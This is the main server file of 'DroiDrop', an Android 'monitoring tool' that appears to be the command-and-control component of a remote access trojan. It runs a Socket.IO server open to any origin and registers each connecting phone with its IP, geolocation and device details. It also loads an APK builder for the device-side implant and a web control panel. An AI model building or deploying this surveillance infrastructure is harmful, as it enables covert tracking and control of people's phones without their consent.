/*
* DroiDrop
* An Android Monitoring Tools
* By t.me/efxtv
*/

const
    express = require('express'),
    app = express(),
    http = require('http'), // Import the http module
    { Server } = require("socket.io"), // Import the Server class from socket.io
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// Create an HTTP server from the Express app
const server = http.createServer(app);

// Initialize Socket.IO with the HTTP server
const io = new Server(server, {
  cors: {
    origin: "*", // Esto permite conexiones desde cualquier origen (puedes ajustarlo por seguridad)
    methods: ["GET", "POST"]
  }
});

io.pingInterval = 30000;
io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);     // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});

// Listen on the HTTP server for both web and socket connections
server.listen(CONST.control_port, () => {
  console.log(`Socket.IO server listening on port: ${CONST.control_port}`);
});

// Also start the Express app for the web interface
app.listen(CONST.web_port, () => {
  console.log(`Web server listening on port: ${CONST.web_port}`);
});

/*
*
*
* t.me/efxtv
*/

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
